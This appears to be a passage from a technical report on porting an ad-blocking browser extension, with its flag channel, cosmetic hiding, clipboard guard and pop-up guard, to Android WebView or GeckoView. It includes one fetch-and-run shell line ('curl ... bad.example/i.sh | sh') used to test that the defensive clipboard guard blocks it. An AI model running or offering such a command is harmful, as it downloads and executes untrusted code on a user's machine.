| flag-channel | Private flag channel (gk-p1 / gk-r1 MessagePort, manifest entries CS-8, CS-9, CS-10) | chrome.storage.local.get (keys settings, siteOverrides); chrome.storage.onChanged.addListener; chrome.runtime.sendMessage (guardEvent, at most 1 in 2 s per frame); chrome.runtime.onMessage.addListener (reply to the popup's pageOrigin, top frame of stream hosts); chrome.runtime.lastError | Two JavaScript worlds that share one DOM. flags.js (ISOLATED) dispatches a synchronous MessageEvent 'gk-p1' on window with one end of a new MessageChannel. Each page-world receiver takes the first port in the capture phase and removes its listener. A receiver that starts later dispatches 'gk-r1'. flags.js answers gk-r1 only until the parser inserts a <script>, the first readystatechange, or the first task (setTimeout 0), and at most 8 ports per frame (checked). Flags sent: youtubeWatchdog, youtubeCosmetic, kick, guardClipboard, guardPopups (checked). Values come from GeckoFeatures.resolve(settings, siteOverrides, host). The receivers read MessageEvent data and ports through getters captured at start, so the page cannot forge them later (checked). Frames: the same frames as the receivers (Kick: all frames). Timing: document start, before page scripts. The vendored scripts (uBO, Twitch) never use flags (checked). | The receivers are unchanged in any host. If no port arrives, each receiver keeps its built-in default: youtubeWatchdog on, youtubeCosmetic on, kick on (guards: clipboard on, pop-up off) (checked). Thus all site scripts run with defaults in a host that has no ISOLATED world. features.js is plain JavaScript with no chrome.* call (checked). flags.js exits at once when chrome.storage is missing (checked). | In Android WebView, flags.js cannot run unchanged because there is no chrome.storage. Options: (a) WebView 1.16+ isolated world (JS_INJECTION_IN_FRAME_AND_WORLD) with a small shim that gets settings from a WebMessageListener registered in that same world (checked that listeners are per world in the docs; isolation strength not checked). (b) A page-world shim registered first, with the flag values written into the script text, and re-registered through ScriptHandler when settings change (no live update until reload). A page-world WebMessageListener object is visible to page scripts (the docs warn about this for wildcard rules, checked), so the app must not trust messages from it. GeckoView: flags.js runs unchanged as a content script; Firefox accepts the chrome namespace (not checked now). The order of MAIN and ISOLATED document_start scripts is not guaranteed, and the code handles both orders (checked in code; UNVERIFIED in a browser). |

Key facts:

- Checked: manifest.json has 11 content_scripts entries. All run at document_start. Version 0.3.6. minimum_chrome_version 137.
- Checked: site script worlds and frames: CS-1 Twitch video-swap MAIN all frames; CS-2 ubo-youtube.js MAIN top; CS-3 ubo-youtube-isolated.js + 2 CSS ISOLATED top; CS-4 youtube.js MAIN top; CS-5 kick.js MAIN all frames; CS-6 features.js + twitch-directory-ads.js ISOLATED top; CS-8 flags.js ISOLATED top (YouTube family, Twitch); CS-9 flags.js ISOLATED all frames (Kick). No site script entry in scope uses match_about_blank or match_origin_as_fallback (only CS-10 and CS-11, the guards on ordinary sites).
- Checked: no site script in scope calls chrome.* except src/settings/flags.js and the watchSwitch() part of src/twitch-directory-ads.js. Both fail open without chrome.storage.
- Checked: sizes. src/youtube.js 2,256 lines / 95,709 bytes. src/vendor/ubo-youtube.js 2,021 lines / 75,134 bytes. src/vendor/ubo-youtube-isolated.js 373 lines / 17,337 bytes. src/vendor/video-swap-new.user.js 985 lines / 51,556 bytes. src/kick.js 769 lines / 28,148 bytes. src/twitch-directory-ads.js 152 lines / 5,778 bytes. src/settings/flags.js 179 lines / 7,214 bytes.
- Checked: uBO layer is uBlock Origin 1.75.0 with uAssets e140ffc, generated 2026-11-15. MAIN scriptlet calls: 36 (www 26, m 9, bare 1). Off by default: rmnt and domBypass (2 MAIN calls on www, 1 ISOLATED call). ISOLATED calls: www 2, m 0.
- Checked: CSS. ubo-youtube.css has 1 rule. youtube-ads.css has 40 rules; 4 of them are for the mobile site (ytm-promoted-sparkles-web-renderer, ytm-ad-slot-renderer, ytm-rich-item-renderer > ad-slot-renderer, lazy-list > ad-slot-renderer).
- Checked: ubo-youtube-network.json has 4 DNR block rules at priority 2000011. Rule 3 (decoy videoplayback expire window) applies to initiator www.youtube.com only.
- Checked: src/youtube.js installs its fetch, XHR, JSON.parse and toString hooks only when the uBO marker Symbol.for("gk.u") is absent at start. Defaults: stallMs 2000, stallUboMs 10000, stallGentleMs 15000, stallGiveUpMs 30000, domSweepMs 400, errorFlash 'gated' 5000 ms. noAdFlag, assignHook and umpBackoff are off.
- Checked: src/youtube.js listens only to yt-navigate-start and yt-navigate-finish. Checked in SponsorBlock's maze-utils source (not on a live page): m.youtube.com sends state-navigateend on window.
- Checked: Twitch script v1.55 (ourTwitchAdSolutionsVersion 23). Backup player types: autoplay, picture-by-picture, embed. Forced token player type: popout. Ad marker: stitched-ad. Ad segment cache: 120 s. Extra hosts it contacts: gql.twitch.tv (from the page) and usher.ttvnw.net plus playlist and segment hosts (from the worker).
- Checked: Kick limits: 2 skips in 60 s, 8 s hold, no rewind over 120 s, no jump to under 5 s from more than 30 s. Worker filter: URL contains amazon-ivs-wasmworker.
- Checked: flag channel limits: 8 ports per frame, 5 page flags, guard ping at most 1 in 2 s. Defaults without a port: youtubeWatchdog on, youtubeCosmetic on, kick on.
- Checked (developer.android.com, androidx.webkit reference and release notes): addDocumentStartJavaScript since 1.9.0 (feature DOCUMENT_START_SCRIPT). It runs 'before any of the page's JavaScript code' in 'any frame whose origin matches allowedOriginRules', in the order of registration, and only for frames that start to load after the call. The docs do not mention about:blank frames or CSP.
- Checked (developer.android.com): androidx.webkit 1.16.0 (2026-05-06) adds named execution worlds: getExecutionWorld(webView, name), addJavaScriptOnEvent(..., INJECTION_EVENT_DOCUMENT_START or INJECTION_EVENT_DOCUMENT_END, rules, world), and per-world addWebMessageListener. Feature flag: JS_INJECTION_IN_FRAME_AND_WORLD. Latest stable: 1.18.0 (2026-10-21). Latest alpha: 1.19.0-alpha01 (2026-11-04). Minimum WebView APK version for worlds: not checked.
- Checked (Mozilla add-ons blog, 2024-07-10): Firefox 128 supports world MAIN for manifest content scripts and full MV3 on Firefox for Android. GeckoView DNR support and GeckoView MV3 content-script status: not checked (an open Fenix MV3 content-script bug was seen in search results only).
- Checked (search summaries, low-authority sources): Chrome for Android has no extensions as of mid-2026. Edge for Android has a curated list. Vivaldi for Android is reported to accept Chrome Web Store extensions. Kiwi Browser is reported as ended in 2025. Firefox for Android has the broadest add-on support.
- Checked (Google developer blog via search): Google blocks its OAuth sign-in in embedded Android WebViews (disallowed_useragent). Direct YouTube account sign-in inside a WebView or GeckoView app: not checked.
- Not checked: whether m.twitch.tv uses the same blob: player worker and React tree as www.twitch.tv.
- Not checked: whether window.chrome exists in the Android WebView page world.
- Not checked: whether a WebView document-start script sees document.documentElement already created (affects twitch-directory-ads.js and kick.js CSS).
- Not checked: YouTube CSP style-src and Trusted Types policy-name rules on www and m.youtube.com.
- UNVERIFIED: all behaviour on an Android phone. No run on the owner's phone exists.

Recommendations:

- Use a GeckoView app with Adgecko as a built-in WebExtension as the first prototype host. It keeps the MAIN/ISOLATED split, all_frames, manifest CSS, the flag channel and DNR with almost no change to the site scripts. Expected manifest changes: a Firefox background entry instead of background.service_worker, an extension id for ensureBuiltIn, and app UI for the popup and the settings page (not checked in GeckoView). UNVERIFIED.
- Before writing app code, test the unchanged extension in a desktop-class engine with a phone user agent, and then as a signed unlisted add-on in Firefox for Android. This shows the m.youtube.com and m.twitch.tv gaps at low cost. UNVERIFIED.
- For an Android WebView host, generate the injection table from manifest.json with a script. Do not copy it by hand. Keep the manifest order: ubo-youtube.js before youtube.js. Use addJavaScriptOnEvent(INJECTION_EVENT_DOCUMENT_START) with an isolated world when WebViewFeature JS_INJECTION_IN_FRAME_AND_WORLD is supported. Otherwise use addDocumentStartJavaScript in the page world.
- Origin rules for WebView must cover the bare domain and the subdomains (for example https://twitch.tv and https://*.twitch.tv, https://kick.com and https://*.kick.com). Twitch and Kick need all frames; YouTube needs the top frame only, so the YouTube scripts must check window.top === window if the origin rule also matches child frames.
- Replace flags.js in WebView with a small host shim. With an isolated world: read settings from a WebMessageListener in that world and dispatch gk-p1 as flags.js does. Without an isolated world: write the flag values into the shim text, register the shim first, and re-register it when settings change. If the shim is missing, all site scripts still run with their defaults (on).
- Inject the CSS (ubo-youtube.css, youtube-ads.css, and the Twitch directory sheet) in WebView through a document-start helper that waits for document.documentElement, then adds a <style> element or an adoptedStyleSheets entry. Wrap src/twitch-directory-ads.js in an IIFE and guard the missing-documentElement case in the host wrapper, not in the file.
- Port the 4 rules of src/rules/ubo-youtube-network.json to WebViewClient.shouldInterceptRequest. Test how src/youtube.js reacts when a decoy request gets an HTTP error status instead of a network error.
- Do not edit the frozen files src/vendor/video-swap-new.user.js and src/kick.js. Copy them byte-for-byte into the app assets at build time and keep the pins in scripts/frozen-pins.json valid.
- Test m.youtube.com first on the phone: player ads (only 9 uBO calls there), feed tiles (4 mobile CSS rules) and the stuck-start watchdog. If the watchdog does not arm, add a state-navigateend listener to src/youtube.js (not a frozen file) in a normal reviewed change. Offer a desktop user agent per site as a fallback, because www.youtube.com gets the full 26-call uBO set and the rpnt rewrite.
- Test Twitch with the mobile user agent (m.twitch.tv) and with a desktop user agent. If m.twitch.tv does not use the blob: player worker or the desktop React tree, use the desktop user agent for twitch.tv in the host, because the frozen script cannot change.
- Do not use Samsung Internet content blockers or other list-only blockers for this port. They cannot run MAIN-world scripts at document start (not checked). Chrome for Android has no extension support (search summary, checked).

### Page layer and user interface

Capabilities:

| Id | Name | Chrome APIs | What a host must give | Portable as is | Android risks |
|---|---|---|---|---|---|
| cosmetic-hiding | Cosmetic hiding (hide leftover ad boxes on ordinary sites) | src/cosmetic.js: chrome.storage.local.get(keys, cb). Keys: generalEnabled, generalAllowedOrigins, settings, siteOverrides, plus P.keysForHost(host, isTop) = cosG (top frame only), cosMeta, cosS:<candidate>, cosE:<candidate>, cosNoG:<candidate>. (checked); src/cosmetic.js: chrome.storage.onChanged.addListener((changes, area)). It reacts only to area 'local' and to the keys generalEnabled, generalAllowedOrigins, cosMeta, settings, siteOverrides. It skips a re-read when the change does not alter resolve(...).cosmetic for this frame's host. (checked); src/cosmetic.js: chrome.runtime.sendMessage({source:'adgecko-general', type:'cosmeticCss'}, cb) -> {css}. Used only when cosMeta is missing (before the worker seeds storage). The worker answers with the text of src/cosmetic-hide.css. (checked); src/cosmetic.js: chrome.runtime.lastError (read after each callback). (checked); src/cosmetic.js: chrome.runtime.onMessage.addListener, top frame only, message {type:'pageOrigin'} -> sendResponse({origin}). The popup uses it because the extension has no 'tabs' permission. (checked); src/cosmetic.js: chrome.runtime.getURL('src/cosmetic-hide.css') + fetch. Only a fallback path when runtime.sendMessage does not exist. (checked); src/general/cosmetic-parse.js: no chrome.* call (one comment only). Pure code. Uses URL for IDN hosts. (checked); src/settings/features.js: no chrome.* call. Pure code. Global GeckoFeatures. (checked); Web APIs: new CSSStyleSheet().replaceSync, document.adoptedStyleSheets; fallback <style id='gk-c1'> under <html> plus a MutationObserver that puts it back. (checked) | Run features.js, cosmetic-parse.js and cosmetic.js (in this order) at document start in every http(s) frame, but not on the 17 stream hosts and their subdomains (the manifest has 34 exclude patterns; cosmetic.js also checks GeckoFeatures.isStreamHost). Chrome runs these files in the ISOLATED world. A host should use an isolated world where it has one. Selection algorithm (checked in code): (1) If cosMeta is absent, use the bundled fallback sheet from the worker. (2) Else read cosG (top frame only), and for each candidateHosts(host) entry (the host, each parent domain, and 'name.*' any-TLD forms) read cosS:<h> and cosE:<h>; for each noHideHosts(host) entry (also the bare host and IPv4 prefixes) read cosNoG:<h>. (3) OR the cosNoG masks: bit 1 = no generic rules ($generichide), bit 2 = no site rules ($specifichide), 3 = both ($elemhide). (4) Generic list minus the exception selectors, plus the site selectors minus the exceptions. Each selector becomes its own rule '<sel>{display:none!important}'. (5) A subframe gets cosG = '' (site rules only). (6) settings + siteOverrides decide on/off through GeckoFeatures.resolve(...).cosmetic; the legacy generalEnabled/generalAllowedOrigins decide only before the migration. The host must give: a read-only, per-frame storage read for these keys; a change event; a store for about 8,367 keys (about 1.02 MB as JSON); and the list-refresh engine (worker) that writes the keys. ALTERNATIVE (one CSS text): the host can run buildPageCss(host, view) itself, because the function is pure and deterministic, and give the page one finished CSS string. The page then needs only one sheet adopt at document start. The generic part (about 535 KB) is the same for every top frame. Thus the host can build it once per list update and send only the small per-host part per navigation. | cosmetic-parse.js and features.js run unchanged in any JS engine (WebView page, WebView named world, GeckoView content script, Node, QuickJS, Hermes): they have no chrome.* call and no DOM use (checked). cosmetic.js runs unchanged with a shim of five members: chrome.storage.local.get, chrome.storage.onChanged.addListener, chrome.runtime.sendMessage, chrome.runtime.lastError, chrome.runtime.onMessage.addListener (checked: in headless Chromium 153 with an in-memory shim, the page got 1 adopted sheet with 13,639 rules, '#AC_ad' had display:none and a normal element stayed visible; no cosmeticCss message was necessary because cosMeta was seeded). cosmetic-hide.css is data only. cosmetic-rules.json is data only; the worker (not a page file) turns it into storage keys with mergeCosmetic + toStorage. | (1) Android WebView has no CSS-injection API (checked: none in the androidx.webkit WebViewCompat reference). The CSS must come from a script. (2) Without an isolated world, the shim global 'chrome', GeckoFeatures and GeneralCosmeticParse are visible to the page (checked: a page script saw chrome.storage in the test). A page could then read siteOverrides, which lists the user's sites (privacy leak). The host must scope reads to the frame's own origin, which the host gets from the WebView (sourceOrigin), never from the message. androidx.webkit 1.16.0 adds named execution worlds that the release notes call isolated worlds (checked); the minimum WebView version for that feature is not checked. (3) Cost: replaceSync of the 535 KB sheet took 7.9 ms, and 36.6 ms with 4x CPU throttle, in desktop headless Chromium (checked). On a slow phone it can be slower (UNVERIFIED). Each rewrite re-parses the whole sheet, thus the code writes only a changed text (checked). (4) The storage read is asynchronous, so an ad box can show for a short time before the sheet arrives (same as Chrome; UNVERIFIED on a phone). (5) The fallback <style> element in the page world can be blocked by a strict page CSP (not checked). Constructed sheets avoid that (not checked). (6) GeckoView/Firefox: adopting a sheet built in a content script is not checked; the code falls back to <style>. |
| clipboard-guard | Clipboard guard (ClickFix: stop pages from copying shell commands) | src/guards/clipboard.js: no chrome.* call (checked: 0 references). It runs in the MAIN world.; src/settings/flags.js (ISOLATED world, gives the flag): chrome.storage.local.get(['settings','siteOverrides']), chrome.storage.onChanged.addListener (settings, siteOverrides), chrome.runtime.lastError. (checked); src/settings/flags.js: chrome.runtime.sendMessage({source:'adgecko-general', type:'guardEvent', kind:'clipboard'\|'popup'}). No reply. At most one message in 2,000 ms per frame. The worker shows a magenta dot on the toolbar icon and keeps the event in chrome.storage.session 'tabSignals'. (checked); src/settings/flags.js: chrome.runtime.onMessage.addListener for {type:'pageOrigin'}, top frame of stream hosts only. (checked); Private channel (not chrome.*): flags.js dispatches a synchronous MessageEvent 'gk-p1' on window with one end of a new MessageChannel; a late page-world script asks with Event 'gk-r1'. Port message in: {f:{youtubeWatchdog, youtubeCosmetic, kick, guardClipboard, guardPopups}}. Port message out: {g:'clipboard'} or {g:'popup'}. (checked); Page APIs that clipboard.js patches (Proxy on the prototype that owns each method): Clipboard.prototype.writeText; Clipboard.prototype.write (text/plain and text/html parts of each ClipboardItem); Document.prototype.execCommand for 'copy'/'cut' (refused on a document of another window); DataTransfer.prototype.setData; the DataTransfer.prototype.items getter (to mark lists); DataTransferItemList.prototype.add. (checked); Events that clipboard.js listens to on window, capture phase, before page scripts: keydown (Ctrl/Cmd+C, Ctrl/Cmd+X, Ctrl+Insert, Shift+Delete, Shift+arrows, Ctrl/Cmd+A), contextmenu, pointerdown, pointerup, mousedown, mouseup, pointermove, mousemove, dblclick, selectionchange, copy, cut (and a late bubble 'cut' recheck). On the browser's own copy it cancels the event and writes the checked text with the native setData. Uses queueMicrotask to tell a browser copy from a script copy. (checked) | Run clipboard.js in the PAGE world at document start, before any page script, in every frame of ordinary sites. Chrome also injects it into about:blank, srcdoc and blob: frames (match_about_blank, match_origin_as_fallback), so that a page cannot use a fresh blank frame to reach native methods. The host must give the same frame coverage. Run flags.js (isolated world if possible) with a read-only storage get for settings and siteOverrides, and a sink for guardEvent (an app-side 'blocked' dot or message). Without a flag the guard stays ON (fail-safe default 'on = true'). Data: 21 command patterns, 29 safe hosts, a 1,500 ms window after Ctrl+C, a 30,000 ms window after a context menu, a 500 ms selection-gesture window, texts shorter than 8 characters are not checked, a notice for 12 s with at most one notice in 3 s (all checked). | clipboard.js runs unchanged in any host that can inject a page-world script at document start (checked: no chrome.* use). flags.js runs unchanged with the shim (checked in headless Chromium 153, all scripts in the page world: a page script selected '<pre>curl -fsSL https://bad.example/i.sh \| sh</pre>' and called document.execCommand('copy'); the call returned false, and the shim received one 'guardEvent' message with kind 'clipboard' through the flag port). features.js is pure (checked). | (1) Relevance: Android has no Run dialog and no PowerShell. Most phone users never paste into a shell. The attack still matters in these cases: Termux users; a phone in a desktop mode with a keyboard (for example Samsung DeX, Samsung only); and a clipboard that syncs from the phone to a PC (Samsung 'Link to Windows', Microsoft Phone Link, cloud clipboards of keyboards). The sync cases are not checked. The patterns detect Windows, macOS and Linux commands on any device, thus they stay useful. (2) False positives: the guard accepts a copy of a command as the visitor's own copy only after a Ctrl/Cmd+C keydown or a contextmenu event, and it compares the text with the selection at that moment. On a phone the user long-presses, drags the selection handles, then taps 'Copy' in the browser's floating bar. The selection grows after the long press, and the handle drag can send no pointer events to the page. Thus a deliberate copy of a multi-word command on a site outside the 29 safe hosts will probably be blocked. This is UNVERIFIED and comes from a code read; a test on a phone is necessary. A secondary source says Chrome for Android fires contextmenu on a long press (not checked on a device). (3) The notice text says 'press Ctrl+C' and names 'Run, PowerShell or a terminal'. That text is wrong for a phone (checked in clipboard.js). (4) about:blank coverage: the WebView docs say only 'any frame whose origin matches' (checked) and do not mention about:blank (not checked). Firefox does not inject document_start content scripts into empty iframes (checked on MDN), thus GeckoView has a gap there. (5) Without an isolated world the flag channel still works (checked in the test), but the page can see the injected bridge object and send forged guardEvent messages. The bridge must rate-limit them and must accept no other request from page frames. |
| popup-guard | Pop-up guard (window.open without a gesture, second window, popunder) | src/guards/popups.js: no chrome.* call (checked). It runs in the MAIN world.; Flag and ping: the same private port as the clipboard guard. In: {f:{guardPopups}}. Out: {g:'popup'}. flags.js forwards the ping as runtime.sendMessage type 'guardEvent', kind 'popup'. (checked); Page APIs patched: window.open only (a Proxy on the window property). Reads navigator.userActivation.isActive (UserActivation.prototype getter), Event.prototype.composedPath, Element.prototype.closest, Node.prototype.baseURI, window.origin. Listens on window, capture phase: pointerdown, mousedown, click, keydown. (checked) | Run popups.js in the PAGE world at document start in every frame, also about:blank/srcdoc/blob: frames. The feature is OFF by default (features.js: guardPopups default false). The flag must arrive over the port to switch it on. Logic (checked): allow same registrable domain or one of 20 allowed destinations (sign-in, payment, share hosts); else block when there is no user activation, when it is the second window in one gesture, or when the last trusted click (within 5,000 ms) was on page content that is not a link, button or form control. A blocked call returns null to the page. The guard carries a 75 + 7 + 120 entry copy of the public-suffix subset. | popups.js runs unchanged in any page-world document-start host (checked: no chrome.* use). It needs navigator.userActivation; if that is missing, it treats each call as a gesture (checked in code). Not tested in a host in this session. | (1) A native alternative exists in WebView: WebSettings.setJavaScriptCanOpenWindowsAutomatically is false by default, and then window.open without a user gesture fails and does nothing (checked in the Android WebSettings reference). A WebView app also decides itself what a new window does (setSupportMultipleWindows, WebChromeClient.onCreateWindow with an isUserGesture value; not checked now). GeckoView has NavigationDelegate.onNewSession (not checked). Thus in a host app the JS guard is mostly a second layer for the 'second window' and 'popunder' rules. (2) Mobile ad tricks often use links with target=_blank, location changes and full-page overlays. The guard checks only window.open (checked in the file comment). (3) The popunder rule can block a real tap on a card or tile that is not a link or button. That is why it is off by default. Touch input sends trusted pointerdown events, so gesture tracking should work (UNVERIFIED on a phone). (4) navigator.userActivation in GeckoView is not checked. |

The host must give: the current page URL (the host knows it, so it can put tab.url in the tabs.query answer and the pageOrigin step is skipped); a tab id; reload of that tab; a way to open the settings page; and 'worker' answers for siteInfo, tabSignal and applyGeneralState. siteInfo needs GeckoFeatures.resolve plus the knowledge of which scripts run on a host (the worker reads the manifest content_scripts for that). (4) Without the worker logic in the host, siteInfo has no answer and Fix this site stays disabled (fixIds() is empty; checked in code). (5) The popup and settings pages write storage. Key facts:

- checked: src/rules/cosmetic-rules.json is 804,416 bytes, format 1, packed_at_utc 2026-11-14T22:00:32Z. Keys: format, packed_at_utc, extras (4 selectors), generic (13,635 selectors, 193,910 characters), sites (7,841 hosts, 16,808 selectors, median 1 and max 79 per host), exceptions (523 hosts, 658 selectors), exclusions (0). It has no noHide key.
- checked (Node 22 scratch run): toStorage(mergeCosmetic(bundled + extras)) gives 8,367 storage keys: 7,841 cosS:, 523 cosE:, 0 cosNoG:, plus cosG, cosMeta, cosKeys. All keys as JSON: 1,018,863 bytes. cosG: 222,126 bytes. cosKeys: 186,317 bytes. cosMeta: {count: 8365, source}. toStorage took 33.6 ms.
- checked: the top-frame CSS from buildPageCss is about 535,017 bytes and 13,639 rules. A subframe gets no generic rules: 0 bytes on most hosts, 338 bytes on advfn.com.
- checked: keysForHost asks 17 keys for www.example.com, 26 for news.so-net.ne.jp, 29 for 192.168.1.10 and 53 for a six-label .co.uk host. buildPageCss took 0.5 to 2.4 ms per call in Node 22 in this container.
- checked (desktop headless Chromium 153 in this container, not a phone): CSSStyleSheet.replaceSync of the 535 KB CSS took 7.9 ms; with 4x CPU throttle 36.6 ms. Adopt plus style recalculation on a 3,000-element page: 12.8 ms and 42 ms. The <style> element route: 14.7 ms and 73 ms. Phone timing is UNVERIFIED.
- checked (rough, eval in a fresh iframe): start cost per frame of clipboard.js + popups.js (69,543 bytes) is 0.5 ms, and 2.3 ms with 4x CPU throttle. features.js + cosmetic-parse.js: 0.1 ms and 0.7 ms.
- checked: src/cosmetic-hide.css is 63,867 bytes. It is the bundled fallback. cosmetic.js uses it only when cosMeta is not in storage.
- checked: chrome.storage.local quota is 10,485,760 bytes and the manifest does not ask for unlimitedStorage (ARCHITECTURE.md). CONCERNS.md H1 gives a measured peak of 8,155,204 bytes on 2026-11-16. Not measured again in this session.
- checked: features.js has 13 FEATURES (10 switchable), 17 STREAM_SITES (34 manifest exclude patterns). flags.js sends 5 page flags, allows 8 ports per frame and forwards at most 1 guard ping in 2,000 ms per frame. The worker keeps tabSignals for 50 tabs.
- checked: clipboard guard data: 21 patterns, 29 safe hosts, 1,500 ms key window, 30,000 ms menu window, 500 ms selection-gesture window, minimum text length 8, notice 12 s, 20,000-node budget for range text.
- checked: pop-up guard data: 20 allowed destinations, PSL copy with 75 generic labels, 7 wildcard TLDs, 120 platform hosts; gesture freshness 5,000 ms; same-gesture window 1,000 ms; default OFF.
- checked: popup FIXABLE has 5 feature ids; a Fix question lives 24 h (FIX_TTL_MS).
- checked: chrome.* calls by file. cosmetic.js 11 references, flags.js 7, popup.js 19, settings.js 7, features.js 1 (comment), cosmetic-parse.js 1 (comment), clipboard.js 0, popups.js 0, threat/psl.js 0, threat/compile.js 0.
- checked: the unchanged page-layer files ran in headless Chromium 153 with an in-memory chrome shim (cosmetic hide, flag port, clipboard block plus guardEvent, popup Allow/Fix/Reload, settings writes and updateLists). This proves the shim surface. It does not prove Android behaviour (UNVERIFIED).
- checked (developer.android.com): WebViewCompat.addDocumentStartJavaScript (feature DOCUMENT_START_SCRIPT, since androidx.webkit 1.9.0) runs 'in any frame whose origin matches allowedOriginRules', 'before any of the page's JavaScript code', and blocks page load until it finishes. addWebMessageListener injects a named JS object into matching frames. No CSS-injection method is listed.
- checked (developer.android.com): androidx.webkit 1.16.0 (2026-05-06) added addJavaScriptOnEvent (DOCUMENT_START or DOCUMENT_END), getExecutionWorld and a world-aware addWebMessageListener, feature JS_INJECTION_IN_FRAME_AND_WORLD. The release notes call these isolated worlds. Latest stable is 1.18.0 (2026-10-21). The minimum WebView APK version for the world feature is not checked.
- checked (developer.android.com): WebSettings.setJavaScriptCanOpenWindowsAutomatically default is false; window.open without a user gesture then fails and does nothing.
- checked (MDN): Firefox does not inject document_start content scripts into empty (about:blank) iframes. checked (search result of the Mozilla add-ons blog): Firefox 128 added world MAIN for manifest content scripts. checked (firefox-source-docs): GeckoView installs a bundled extension with installBuiltIn; app messaging uses runtime.sendNativeMessage/connectNative and needs the geckoViewAddons permission, and nativeMessagingFromContent for content scripts.
- checked (secondary web sources only, weak): the normal Chrome for Android app has no extension support in mid-2026; Kiwi Browser shut down in 2025; Quetta, Helium, Edge Canary (experimental), Vivaldi and Yandex are said to run Chrome Web Store extensions; Firefox for Android runs AMO extensions.
- checked (search summary of the Samsung developer guide): Samsung Internet (Samsung only) accepts content-blocker apps that give Adblock Plus-format filters through a ContentProvider in an APK. Such an app cannot run page scripts, thus no clipboard or pop-up guard there. Element-hiding support is not checked.
- not checked: Chrome for Android fires contextmenu on a long press of text (one old secondary source says yes). This decides whether the clipboard guard blocks deliberate copies on a phone.
- not checked: whether WebView document-start scripts reach about:blank, srcdoc and blob: frames.
- checked: the repository has no change after this task (git status shows 0 entries; HEAD 0e8dd60).

Recommendations:

- SHIM (answer to question 5), page-frame part, read-only. Implement only these members: (1) chrome.storage.local.get(keys, cb): asynchronous; return only the keys that exist; return structured clones. (2) chrome.storage.onChanged.addListener(fn): call fn(changes, 'local') with {key: {oldValue, newValue}}. (3) chrome.runtime.lastError: a property that is undefined after a good call. (4) chrome.runtime.sendMessage(msg, cb): accept only type 'cosmeticCss' (reply {css}) and type 'guardEvent' (no reply, kind 'clipboard' or 'popup'); refuse all other types from page frames. (5) chrome.runtime.onMessage.addListener(fn): may be a no-op, because the host knows the page URL and does not need 'pageOrigin'. The global object chrome must have a 'storage' member, because cosmetic.js and flags.js start only when typeof chrome !== 'undefined' && chrome.storage (checked). chrome.runtime.getURL is not necessary when sendMessage exists (checked).
- SHIM, app-page part (popup and settings, app-owned origin only): add chrome.storage.local.set(patch, cb), chrome.storage.local.remove(keys, cb), chrome.runtime.getManifest() -> {version}, chrome.runtime.getURL(path), chrome.runtime.openOptionsPage(), chrome.tabs.query(q, cb) -> [{id, url}] (give url, then tabs.sendMessage is never called), chrome.tabs.reload(id, opts, cb), chrome.tabs.create({url}, cb), chrome.tabs.sendMessage(id, msg, opts, cb) as a no-op, and runtime.sendMessage types siteInfo, tabSignal, applyGeneralState, updateLists, revertLists. Keep the worker rule: only the settings page may send updateLists and revertLists. Map window.close() to 'close the bottom sheet'.
- Security of the shim in a WebView: do not put a global 'chrome' object in the page world. Put the shim and the page-layer files inside one wrapper function that declares a local 'chrome' binding, or run them in a named execution world (androidx.webkit 1.16.0+, feature JS_INJECTION_IN_FRAME_AND_WORLD) when the device supports it. The native listener must take the host from the WebView's sourceOrigin, never from the message, and must return only the keys of that host (keysForHost plus settings and the one matching siteOverrides entry). This stops a page that reads the user's per-site list.
- Prototype order for a WebView host (a browser app with its own WebView): (a) one document-start bundle in all frames: shim + features.js + cosmetic-parse.js + cosmetic.js + flags.js (named isolated world when available), and clipboard.js + popups.js in the page world; (b) a Kotlin bridge with addWebMessageListener for 'get keys for my origin' and 'guardEvent'; (c) store the toStorage() output in the app (a file or SQLite) and fire change events to live frames; (d) popup.html and settings.html from WebViewAssetLoader with the app-page shim. The scratch test files of this session can seed the work: (a scratch file of the research session) and run.mjs (the scratchpad can be cleared).
- Faster cosmetic path for the prototype: build the generic CSS (about 535 KB) once in the host after each list update, and send it to top frames as one string; send only the per-host site part to each frame. Use buildPageCss unchanged in a JS runtime on the host side, or keep it in the page bundle. Do not rewrite the adopted sheet when the text is the same (cosmetic.js already does this).
- GeckoView path: package the extension as a built-in extension. The content scripts can stay unchanged, because Firefox has isolated content scripts and MAIN world support since 128. Then test three gaps first: adoptedStyleSheets from a content script, injection into about:blank frames (Firefox does not inject document_start into empty iframes), and the tabs and options-page delegates that the popup needs.
- Pop-up guard on Android: keep the WebView default setJavaScriptCanOpenWindowsAutomatically(false) as the first layer, and decide new windows in onCreateWindow. Keep popups.js as the second layer and keep it off by default, as on desktop.
- Clipboard guard on Android: keep it on (low cost: about 2 ms per frame at 4x throttle on desktop). Before a release, test a deliberate long-press copy of a 'curl ... | sh' line on a site outside the safe list on a real phone. If it is blocked, add a phone gesture rule (for example the selection at the time of the trusted copy event, when the last selection gesture was a touch). Change the notice text for phones. These are owner decisions.
- Popup on a phone: change only popup.css for the prototype (body width 100% with a max width, 48 dp touch targets), and keep popup.js unchanged. Change the words that name Chrome, Windows and chrome://extensions in a later step (owner decision, and TESTING.md section 7 says tests read some sentences in documents).
- Measure on the owner's phone before design decisions: the time from navigation to the adopted sheet, the replaceSync time of the 535 KB sheet, the first-paint ad flash, and the contextmenu/copy event order on a long-press copy. All phone behaviour in this report is UNVERIFIED.
- Sources used: https://developer.android.com/reference/androidx/webkit/WebViewCompat ; https://developer.android.com/reference/androidx/webkit/JavaScriptExecutionWorld ; https://developer.android.com/jetpack/androidx/releases/webkit ; https://developer.android.com/reference/android/webkit/WebSettings ; https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/manifest.json/content_scripts ; https://firefox-source-docs.mozilla.org/mobile/android/geckoview/consumer/web-extensions.html ; https://blog.mozilla.org/addons/2024/07/10/manifest-v3-updates-landed-in-firefox-128/ ; https://developer.samsung.com/internet/android/adblockers-guide.html ; https://extensionbooster.net/blog/chrome-extensions-android-2026-what-works-guide/ ; https://piunikaweb.com/2026/06/01/helium-browser-android-mv2-extensions/ ; https://kiwix.lema.org/stackoverflow.com_en_all_2023-11/questions/55560929/weird-behavior-of-long-presses-in-chrome-and-firefox-for-android

### Repository checks, CI, packaging, licences

